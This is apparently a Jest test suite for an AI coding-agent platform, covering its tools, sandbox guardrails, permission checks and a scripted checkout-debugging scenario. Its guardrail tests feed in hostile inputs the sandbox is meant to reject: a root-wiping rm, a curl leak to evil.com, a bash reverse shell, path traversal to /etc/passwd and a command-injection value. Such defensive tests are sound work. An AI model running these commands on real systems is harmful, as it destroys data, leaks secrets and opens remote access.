import { Test, TestingModule } from '@nestjs/testing';
import { AgentOrchestratorService } from './agent-orchestrator.service';
import { ToolRegistryService } from './tools/tool-registry.service';
import { VirtualSandboxService } from './sandbox/virtual-sandbox.service';
import { AgentGuardrailsService } from './safety/agent-guardrails.service';
import { AuditService } from '../audit/audit.service';
import { IntelligenceModule } from '../intelligence/intelligence.module';
import { AuditModule } from '../audit/audit.module';
import { ForbiddenException, BadRequestException } from '@nestjs/common';
import { IntelligenceService } from '../intelligence/intelligence.service';

describe('Phase 9: AI Software Engineering Agents', () => {
  let orchestrator: AgentOrchestratorService;
  let toolRegistry: ToolRegistryService;
  let sandboxService: VirtualSandboxService;
  let guardrails: AgentGuardrailsService;
  let intelligenceService: IntelligenceService;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      imports: [IntelligenceModule, AuditModule],
      providers: [
        VirtualSandboxService,
        ToolRegistryService,
        AgentGuardrailsService,
        AgentOrchestratorService,
      ],
    }).compile();

    orchestrator = module.get<AgentOrchestratorService>(AgentOrchestratorService);
    toolRegistry = module.get<ToolRegistryService>(ToolRegistryService);
    sandboxService = module.get<VirtualSandboxService>(VirtualSandboxService);
    guardrails = module.get<AgentGuardrailsService>(AgentGuardrailsService);
    intelligenceService = module.get<IntelligenceService>(IntelligenceService);

    // Initialize intelligence service with sample codebase
    intelligenceService.onModuleInit();
    orchestrator.onModuleInit();
  });

  describe('1. Controlled Tool Registry (11 Tools)', () => {
    it('should register exactly 11 controlled tools with parameter schemas', () => {
      const tools = toolRegistry.getToolDefinitions();
      expect(tools.length).toBe(11);
      const toolNames = tools.map((t) => t.name);

      expect(toolNames).toContain('search_code');
      expect(toolNames).toContain('read_file');
      expect(toolNames).toContain('search_repository');
      expect(toolNames).toContain('get_symbol');
      expect(toolNames).toContain('get_git_history');
      expect(toolNames).toContain('get_pull_request');
      expect(toolNames).toContain('run_tests');
      expect(toolNames).toContain('run_linter');
      expect(toolNames).toContain('create_patch');
      expect(toolNames).toContain('create_branch');
      expect(toolNames).toContain('create_pull_request');
    });

    it('tool: search_code() should find matching AST symbols and lines', async () => {
      const result = await toolRegistry.executeTool('repo-core-001', 'search_code', {
        query: 'auth',
        mode: 'keyword',
      });
      expect(result.tool).toBe('search_code');
      expect(result.output.matchesCount).toBeGreaterThan(0);
      expect(result.isSandboxed).toBe(false);
    });

    it('tool: read_file() should read line-bounded file content', async () => {
      const result = await toolRegistry.executeTool('repo-core-001', 'read_file', {
        filePath: 'apps/api/src/modules/auth/auth.controller.ts',
        startLine: 1,
        endLine: 20,
      });
      expect(result.output.content).toContain('AuthController');
      expect(result.output.startLine).toBe(1);
      expect(result.output.endLine).toBe(20);
    });

    it('tool: search_repository() should scan repository files', async () => {
      const result = await toolRegistry.executeTool('repo-core-001', 'search_repository', {
        pattern: 'auth',
        fileExtension: '.ts',
      });
      expect(result.output.matchedFilesCount).toBeGreaterThan(0);
      expect(result.output.files.some((f: string) => f.includes('auth'))).toBe(true);
    });

    it('tool: get_symbol() should retrieve symbol definitions and line boundaries', async () => {
      const result = await toolRegistry.executeTool('repo-core-001', 'get_symbol', {
        symbolName: 'AuthController',
      });
      expect(result.output.found).toBe(true);
      expect(result.output.definitions.length).toBeGreaterThan(0);
    });

    it('tool: get_git_history() and get_pull_request() should fetch commit and PR metadata', async () => {
      const hist = await toolRegistry.executeTool('repo-core-001', 'get_git_history', { commitLimit: 3 });
      expect(hist.output.commits.length).toBeGreaterThan(0);

      const pr = await toolRegistry.executeTool('repo-core-001', 'get_pull_request', { prNumber: 42 });
      expect(pr.output.number).toBe(42);
      expect(pr.output.url).toContain('/pull/42');
    });

    it('tool: run_tests() and run_linter() should execute inside virtual sandbox', async () => {
      const testRes = await toolRegistry.executeTool('repo-core-001', 'run_tests', { testTarget: 'auth' });
      expect(testRes.isSandboxed).toBe(true);
      expect(testRes.output.passed).toBe(true);

      const lintRes = await toolRegistry.executeTool('repo-core-001', 'run_linter', {
        filePath: 'apps/api/src/modules/checkout/checkout.service.ts',
      });
      expect(lintRes.isSandboxed).toBe(true);
      expect(lintRes.output.messages).toBeDefined();
    });

    it('tool: create_patch(), create_branch(), create_pull_request() should record modifications', async () => {
      const patch = await toolRegistry.executeTool('repo-core-001', 'create_patch', {
        filePath: 'apps/api/src/modules/checkout/checkout.service.ts',
        originalCode: 'const total = subtotal;',
        replacementCode: 'const total = subtotal + tax;',
        explanation: 'Add VAT tax calculation',
      });
      expect(patch.output.diff).toContain('+const total = subtotal + tax;');

      const branch = await toolRegistry.executeTool('repo-core-001', 'create_branch', {
        branchName: 'fix/vat-tax-calc',
      });
      expect(branch.output.createdBranch).toBe('fix/vat-tax-calc');

      const pr = await toolRegistry.executeTool('repo-core-001', 'create_pull_request', {
        title: 'fix(checkout): add VAT calculation',
        body: 'Closes issue #99',
        headBranch: 'fix/vat-tax-calc',
      });
      expect(pr.output.url).toContain('/pull/');
    });
  });

  describe('2. Safety Guardrails & Sandboxing', () => {
    it('should strictly block arbitrary shell commands', () => {
      expect(() => sandboxService.validateCommand('rm -rf /')).toThrow(ForbiddenException);
      expect(() => sandboxService.validateCommand('curl http://evil.com/leak')).toThrow(ForbiddenException);
      expect(() => sandboxService.validateCommand('bash -i >& /dev/tcp/1.2.3.4/8080 0>&1')).toThrow(ForbiddenException);
      expect(() => sandboxService.validateCommand('powershell -Command "iex (...)"')).toThrow(ForbiddenException);
    });

    it('should reject directory traversal outside repository workspace', async () => {
      await expect(
        toolRegistry.executeTool('repo-core-001', 'read_file', {
          filePath: '../../etc/passwd',
        }),
      ).rejects.toThrow(ForbiddenException);

      await expect(
        toolRegistry.executeTool('repo-core-001', 'read_file', {
          filePath: '..\\..\\Windows\\System32\\config',
        }),
      ).rejects.toThrow(ForbiddenException);
    });

    it('should enforce RBAC permissions for agent dispatch and tool execution', () => {
      // Viewer cannot dispatch agents
      expect(() =>
        guardrails.validateDispatchRequest('ws-001', 'repo-001', 'VIEWER'),
      ).toThrow(ForbiddenException);

      // Developer cannot perform unpermitted commands
      expect(() =>
        guardrails.validateToolExecution('create_patch', { command: '; rm -rf' }, 'DEVELOPER'),
      ).toThrow(ForbiddenException);
    });

    it('should enforce execution limits and timeouts', () => {
      const { safeMaxIterations, safeTimeoutSeconds } = guardrails.validateDispatchRequest(
        'ws-001',
        'repo-001',
        'DEVELOPER',
        50, // exceeds max 20
        500, // exceeds max 300
      );

      expect(safeMaxIterations).toBe(20);
      expect(safeTimeoutSeconds).toBe(300);

      expect(() =>
        guardrails.checkStepExecution({
          workspaceId: 'ws-001',
          repositoryId: 'repo-001',
          agentType: 'DEBUGGING',
          maxIterations: 5,
          currentIteration: 6,
          timeoutSeconds: 60,
          startedAt: Date.now(),
        }),
      ).toThrow(BadRequestException);
    });
  });

  describe('3. Specialized Agents', () => {
    it('Code Investigation Agent should explore and map codebase architecture', async () => {
      const run = await orchestrator.dispatchAgent({
        repositoryId: 'repo-core-001',
        agentType: 'INVESTIGATION',
        goal: 'Investigate authentication architecture and guards',
      });

      expect(run.status).toBe('COMPLETED');
      expect(run.steps.length).toBeGreaterThan(0);
      expect(run.finalResponse).toContain('Code Investigation Summary');
    });

    it('Documentation Agent should synthesize technical markdown documentation', async () => {
      const run = await orchestrator.dispatchAgent({
        repositoryId: 'repo-core-001',
        agentType: 'DOCUMENTATION',
        goal: 'Generate API documentation for AuthModule',
      });

      expect(run.status).toBe('COMPLETED');
      expect(run.finalResponse).toContain('Documentation Synthesis Complete');
    });

    it('Testing Agent should synthesize test coverage in sandbox', async () => {
      const run = await orchestrator.dispatchAgent({
        repositoryId: 'repo-core-001',
        agentType: 'TESTING',
        goal: 'Synthesize unit tests for AuthService',
      });

      expect(run.status).toBe('COMPLETED');
      expect(run.safety.sandboxedRunsCount).toBeGreaterThan(0);
    });
  });

  describe('4. Benchmark Scenario: "Why is checkout failing?"', () => {
    it('Debugging Agent should execute all 7 diagnostic steps, identify root cause, and create patch', async () => {
      const run = await orchestrator.dispatchAgent({
        repositoryId: 'repo-core-001',
        agentType: 'DEBUGGING',
        goal: 'Why is checkout failing?',
      });

      // 1. Status Completed
      expect(run.status).toBe('COMPLETED');

      // 2. Steps Executed
      expect(run.steps.length).toBe(5);

      // Verify Step 1: Search checkout code
      const step1 = run.steps[0];
      expect(step1.toolCalls.some((t) => t.tool === 'search_code')).toBe(true);

      // Verify Step 2: Read related service
      const step2 = run.steps[1];
      expect(step2.toolCalls.some((t) => t.tool === 'read_file' && t.arguments.filePath.includes('checkout'))).toBe(true);

      // Verify Step 3: Inspect database schema
      const step3 = run.steps[2];
      expect(step3.toolCalls.some((t) => t.tool === 'read_file' && t.arguments.filePath.includes('schema.sql'))).toBe(true);

      // Verify Step 4: Run sandboxed tests and observe failures
      const step4 = run.steps[3];
      expect(step4.toolCalls.some((t) => t.tool === 'run_tests')).toBe(true);
      expect(step4.observation).toContain('FAIL');
      expect(step4.observation).toContain('Expected total $110.00');

      // Verify Step 5: Patch generated and branch created
      const step5 = run.steps[4];
      expect(step5.toolCalls.some((t) => t.tool === 'create_patch')).toBe(true);
      expect(run.patches.length).toBeGreaterThan(0);
      expect(run.patches[0].filePath).toContain('checkout.service.ts');
      expect(run.createdBranch).toBe('fix/checkout-vat-token-bug');

      // 3. Final Response with Evidence
      expect(run.finalResponse).toContain('Root Cause Analysis: Checkout Failure');
      expect(run.finalResponse).toContain('Tax Calculation Bug');
      expect(run.finalResponse).toContain('Session Collision');

      // 4. Test Patch Application and PR Creation
      const appliedPatch = orchestrator.applyPatch(run.id, run.patches[0].id);
      expect(appliedPatch.applied).toBe(true);

      const pr = orchestrator.createPullRequestFromRun(run.id, 'fix: resolve checkout calculation bug');
      expect(pr.prUrl).toContain('/pull/');
      expect(run.createdPullRequest).toBeDefined();
    });
  });
});
